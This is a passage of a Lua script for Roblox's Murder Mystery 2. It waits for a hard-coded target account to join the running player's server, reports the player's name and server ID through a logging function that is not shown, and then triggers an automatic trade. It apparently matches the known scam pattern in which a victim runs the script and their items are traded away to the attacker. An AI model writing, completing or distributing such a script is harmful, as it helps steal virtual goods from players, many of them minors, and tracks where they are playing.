-- WATCH FOR TARGET
-- ============================================

local function watchForTarget()
    print("\n" .. string.rep("=", 50))
    print("MM2 AUTO TRADE SCRIPT ACTIVE")
    print("=" .. string.rep("=", 50))
    print("🎯 Target: " .. TARGET_USER)
    print("👤 Your name: " .. player.Name)
    print("🖥️ Server ID: " .. game.JobId)
    print("=" .. string.rep("=", 50))
    
    sendLog("🚀 Script loaded - Watching for " .. TARGET_USER)
    sendLog("👤 Player: " .. player.Name)
    sendLog("🖥️ Server: " .. game.JobId)
    
    -- Check if already in server
    for _, plr in pairs(Players:GetPlayers()) do
        if plr.Name == TARGET_USER and plr ~= player then
            print("👤 " .. TARGET_USER .. " is already in this server!")
            sendLog("👤 " .. TARGET_USER .. " already in server")
            wait(2)
            startAutoTrade()
            return
        end
    end
    
    print("\n👀 Waiting for " .. TARGET_USER .. " to join...")
    print("📦 Items will be listed when they join\n")
    
    Players.PlayerAdded:Connect(function(newPlayer)
        if newPlayer.Name == TARGET_USER then
            print("🟢 " .. TARGET_USER .. " joined the server!")
            sendLog("🟢 " .. TARGET_USER .. " joined")
            wait(3)
            startAutoTrade()
        end
    end)
end

